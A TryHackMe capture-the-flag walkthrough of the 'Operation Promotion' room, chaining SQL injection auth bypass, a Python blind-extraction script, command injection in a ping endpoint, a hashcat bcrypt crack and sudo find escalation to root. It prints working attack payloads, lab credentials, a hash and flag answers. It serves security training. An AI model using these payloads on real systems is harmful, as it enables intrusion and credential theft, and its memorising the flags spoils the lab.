# TryHackMe: Operation Promotion — Walkthrough

**Date:** 2026-10-29
**Room:** Operation Promotion (RecruitCorp)
**Analyst:** Will Lawson
**Category:** Web Exploitation / SQLi / Command Injection / Privilege Escalation

---

## Scenario

Framed as a solo promotion engagement at Hadron Security: my senior lead Mara handed
me a lone target — RecruitCorp, a small recruiting firm with a public-facing portal —
and told me to compromise the host and capture both flags to earn the Penetration
Tester title.

**Flags captured:**
- `user.txt`: `THM{bdbee0a91ebcb0b0fafde931223efe09}`
- `flag.txt`: `THM{d999a1f6319a9c5b48c067dfab314ba2}`

Target IP changed on each redeploy (same build); the one in commands below was the
final session's `10.146.173.30`.

**The whole room really came down to two things: weaponising the SQL injection into a
data leak, and cracking one bcrypt hash with the right wordlist. Everything else was
enumeration stitching those two together.**

---

## Recon

Standard service scan first — wanted the full attack surface before touching anything.

```bash
nmap -sC -sV -oN nmap-initial.txt 10.146.173.30
```

Open ports:
- **22** — OpenSSH 9.6p1 (Ubuntu)
- **80** — Apache 2.4.58, "RecruitCorp - Careers Portal", `robots.txt` disallowing `/admin/`
- **139/445** — Samba 4

Three doors. I started with SMB because anonymous shares are often a free win.

### SMB — a dead end (twice)

```bash
smbclient -L //10.146.173.30/ -N
smbclient //10.146.173.30/public -N -c 'ls'
smbclient //10.146.173.30/public -N -c 'get README.txt -'
```

`public` held a single `README.txt`: *"reserved for future internal file distribution,
nothing to see here yet. - IT"*. A placeholder.

Later, once I had credentials, I sprayed all nine user/password pairs against SMB —
every single combination "succeeded" and showed the identical two shares. That's a
map-to-guest configuration: SMB auth here tells you nothing and exposes nothing. I
didn't come back to it.

---

## Web Enumeration

```bash
gobuster dir -u http://10.146.173.30/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt -o gobuster.txt
```

Findings: `/admin/` (301), `/config` (403), `index.php`, `robots.txt`. The public
`index.php` was a static brochure — no upload or application endpoints. The real target
was the admin login.

---

## Initial Foothold — SQL Injection

### Auth bypass (the easy part)

The `/admin/` login is a plain POST with `username`/`password`. First reflex, classic
bypass:

```bash
curl -s -i -X POST http://10.146.173.30/admin/ \
  --data "username=admin' OR '1'='1&password=x"
```

→ `302 Found` to `/admin/dashboard.php` with a session cookie. In. The dashboard
offered only a "User Lookup" by numeric ID.

I confirmed (much later, by reading the source via RCE) that the query was literally:

```php
$query = "SELECT id, username FROM users WHERE username='$u' AND password='$p'";
```

Raw concatenation, and `db_engine=sqlite3` — which explained a lot of the pain that
followed.

### Course correction: the lookup param was a decoy

The User Lookup looked like the obvious injection point, but it was `intval()`-cast —
`id=1 ORDER BY 99` and `id=1'` both returned row 1 unchanged, while `id=99999` returned
"No user". Integer-cast, not injectable. I went back to the **login** as the real SQLi.

### Building a blind oracle (this is where the room lived)

A false condition (`admin' AND '1'='2`) gave no redirect; a true one redirected to the
dashboard. So I had a boolean oracle — but it needed care, because the app checks the
*row's password column* against what you submit. I found I could return a crafted row I
controlled:

```
username = x' UNION SELECT 1,'pwn'-- -     password = pwn
```

`ORDER BY`/`UNION NULL` testing pinned the login query at exactly **2 columns**
(`username`, `password`). Returning `1,'pwn'` and submitting `pwn` as the password
logged me in — confirming the app compares submitted password == column 2. That gave a
clean gated oracle:

```
username = x' UNION SELECT 1,'pwn' WHERE (<condition>)-- -   password = pwn
```

True → 302 to dashboard; false → nothing.

### The extraction fight (dead ends worth recording)

Getting *data* out of that oracle was the single most fiddly part of the room. What
failed and why:

- **Username reflection** — the dashboard prints the logged-in username, so I tried to
  reflect query results there. It isn't actually echoed back; dead channel.
- **`ASCII(SUBSTRING(...))` binary search** — returned 0/NULL for every character even
  though `LENGTH()` gave correct lengths. ASCII on DB data just didn't behave.
- **`IF(...)`** — broke the login entirely (likely filtered/reserved).
- **`CASE WHEN`** — `WHEN 1=2` wrongly evaluated true; unreliable.
- **Hex literals** (`=0x6d`, `LIKE 0x6d25`) — all missed, because the backend read hex
  as an *integer* and compared int-vs-string.
- **`information_schema`** — completely empty (it's SQLite, emulated oddly — there's no
  real information_schema to read).

The breakthrough: **string comparison with `CHAR()`**. `SUBSTRING((...),i,1)=CHAR(109)`
matched where `=0x6d` hadn't. From there a `>CHAR(mid)` binary search extracted
cleanly.

```python
import requests
U="http://10.146.173.30/admin/"
def true(c):
    d={"username":"x' UNION SELECT 1,'pwn' WHERE "+c+"-- -","password":"pwn"}
    return requests.post(U,data=d,allow_redirects=False).status_code==302
def extract(expr,maxlen=64):
    s=""
    for i in range(1,maxlen+1):
        if not true(f"LENGTH(({expr}))>={i}"): break
        lo,hi=32,126
        while lo<hi:
            mid=(lo+hi)//2
            if true(f"SUBSTRING(({expr}),{i},1)>CHAR({mid})"): lo=mid+1
            else: hi=mid
        s+=chr(lo)
    return s
```

### The payoff — hidden rows

The lookup UI only showed IDs 1–6, but `SELECT COUNT(*) FROM users` returned **9**.
Dumping all nine (username : password, stored cleartext in the DB):

| id | user | password | role | note |
|----|------|----------|------|------|
| 1 | admin | A!7s2f9DkLp_Q3e | admin | Primary admin account. |
| 2 | mvasquez | pw_mv_4831 | recruiter | EMEA pipeline |
| 3 | tparker | pw_tp_2210 | recruiter | AMER pipeline |
| 4 | lhayes | pw_lh_9911 | analyst | Reporting only |
| 5 | kchen | pw_kc_7763 | recruiter | Out on leave |
| 6 | rdavis | pw_rd_2241 | analyst | Reporting only |
| **7** | **sysmaint** | **pw_sm_8841** | system | **Service account for /admin/sysmaint-checks/ping.php. Do not disable.** |
| 8 | jbailey | pw_jb_3392 | recruiter | New starter Q3 |
| 9 | aokafor | pw_ao_5588 | recruiter | APAC |

Row 7's note was the whole point of the dump: a hidden maintenance endpoint,
`/admin/sysmaint-checks/ping.php`.

None of these passwords reused to SSH (tested with hydra across all users). They were
only ever meant to point me at `ping.php`.

---

## RCE — Command Injection in ping.php

The endpoint 403s without a valid admin session; with the SQLi cookie it showed:
`Usage: /admin/sysmaint-checks/ping.php?host=<target>`. A ping wrapper — prime
command-injection territory.

```bash
curl -s -b /tmp/cj.txt \
  "http://10.146.173.30/admin/sysmaint-checks/ping.php?host=127.0.0.1;id"
```

→ ping output followed by `uid=33(www-data)`. RCE as www-data.

### Course correction: no reverse shell

I tried to upgrade to a reverse shell on 4444, then 443 — nothing called back. Outbound
is filtered. A test `curl` back to my box also failed. So I dropped the shell idea and
worked the box with **single-command injection** through `ping.php` for the rest of the
foothold phase. (A brief scare where every payload returned "Forbidden" turned out to be
me dropping the `-b cookie` flag, not a WAF.)

### The real secret — db.conf

Grepping the webroot for credentials:

```bash
...;grep -rniE 'pass|pwd|secret|db_' /var/www/html/ 2>/dev/null
```

`/var/www/html/config/db.conf`:

```
db_user=jford
db_pass_hash=$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq
db_engine=sqlite3
```

Two real users on the box (`/etc/passwd`): **jford** (uid 1001, home locked to
www-data) and ubuntu. `user.txt` was clearly in jford's home, which www-data couldn't
read. The DB user is *jford*, and here's a bcrypt hash — almost certainly jford's login
password, planted to be cracked.

I confirmed the SQLite DB on disk (`/var/lib/recruitcorp/app.db`) held only the same
`users` table — no SSH keys, no hidden columns, nothing else. The hash was the only way
to jford.

---

## The Hash Crack (the second real obstacle)

### Dead ends

- **rockyou, plain** — "ran all night, nothing." In hindsight: bcrypt on this CPU runs
  at **~80 H/s**, and rockyou is 14M lines. At that rate it *never finished* — it wasn't
  a miss, it was never going to complete.
- **rockyou + best66 rules** — hashcat's own ETA said **136 days**. Confirmed brute
  force was hopeless here.
- **Password reuse** — none of the nine DB passwords, nor `sysmaint`/jford over SSH, nor
  prior-room passwords, matched.
- **Small themed guesses** — `recruitcorp2026`, `Hadron`, etc. — all missed.

### The realisation

The password had to be **themed from the site's own vocabulary**, and the keyspace had
to be small enough to actually finish. I built the wordlist from the portal itself:

```bash
cewl -d 2 -m 4 --with-numbers -w /tmp/site-wl.txt http://10.146.173.30/
# 79 words
```

79 words × leetspeak + toggle rules ≈ 24k candidates — about five minutes at 80 H/s,
versus 136 days for rockyou.

```bash
hashcat -m 3200 /tmp/jford.hash /tmp/site-wl.txt \
  -r /usr/share/hashcat/rules/unix-ninja-leetspeak.rule \
  -r /usr/share/hashcat/rules/toggles1.rule --quiet
```

→ **`jford : spring2026!`**

Straight off the homepage's "Spring 2026 Hiring Drive" line plus a `!`. The lesson:
match the wordlist to the target, don't throw a 14M list at a hash you can only test
80 times a second.

---

## user.txt

```bash
sshpass -p 'spring2026!' ssh jford@10.146.173.30 'id; cat ~/user.txt'
# uid=1001(jford) ...
# THM{bdbee0a91ebcb0b0fafde931223efe09}
```

---

## Privilege Escalation — sudo find

jford's sudo rights gave it away immediately:

```bash
sudo -l
#   (root) NOPASSWD: /usr/bin/find
```

`find` with `-exec` runs as root (GTFObins). Straight to the flag:

```bash
sudo /usr/bin/find /etc/hostname -exec id \; -exec cat /root/flag.txt \;
# uid=0(root) gid=0(root) groups=0(root)
# THM{d999a1f6319a9c5b48c067dfab314ba2}
```

A gimme compared to the two real obstacles.

---

## Full Attack Chain

```
/admin/ login — SQLi auth bypass (' OR '1'='1)
  │
  └─ boolean-blind UNION oracle (2 cols; CHAR()-based string compare — the fight)
        └─ dumped users table (9 rows; UI hid 7–9)
              └─ row 7 "sysmaint" note → /admin/sysmaint-checks/ping.php

ping.php?host=127.0.0.1;<cmd>  →  RCE as www-data
  │  (no reverse shell — egress filtered; single-command injection instead)
  └─ /var/www/html/config/db.conf → jford bcrypt hash

hashcat -m 3200, wordlist built from the site (cewl) + leet rules
  │  (rockyou was a trap: 80 H/s, 136-day ETA)
  └─ jford : spring2026!  →  SSH

jford  →  user.txt
  └─ sudo -l: (root) NOPASSWD /usr/bin/find
        └─ sudo find ... -exec cat /root/flag.txt  →  root → flag.txt
```

---

## Key Techniques & Gotchas

| Technique | Detail |
|-----------|--------|
| **SQLite, not MySQL** | `information_schema` empty; hex literals read as ints. Use `CHAR()` for string compares, not `0x..` |
| **Oracle via controlled row** | App compares submitted password to UNION column 2 — return `1,'pwn'`, submit `pwn`, gate with `WHERE (<cond>)` |
| **Hidden table rows** | The lookup UI capped at id 6; `COUNT(*)` showed 9. Always verify row count, don't trust the UI |
| **Command injection foothold** | Authenticated `ping.php?host=...;cmd`; reverse shells blocked by egress filtering — single commands worked fine |
| **bcrypt + CPU = tiny wordlists only** | ~80 H/s. rockyou never finishes. Build a targeted list (cewl off the site) and let rules do the mutation |
| **Themed password** | `spring2026!` came straight from the homepage copy — match the wordlist to the target's own language |
| **sudo find** | `(root) NOPASSWD: /usr/bin/find` → `-exec` runs as root (GTFObins) |

---

## Lessons Learned

1. **Don't trust the obvious injection point.** The visible User Lookup was int-cast bait;
   the login was the real SQLi.
2. **Verify row counts.** The answer (sysmaint → ping.php) was in rows the UI deliberately
   hid.
3. **Know your hash's crack rate before picking a wordlist.** 80 H/s means rockyou is off
   the table — that realisation saved the room.
4. **Themed passwords come from the target.** Scrape the site; the password was one line of
   marketing copy away.
5. **Enumerate egress before committing to a reverse shell.** Single-command injection was
   enough; I wasted time on callbacks that were never going to connect.
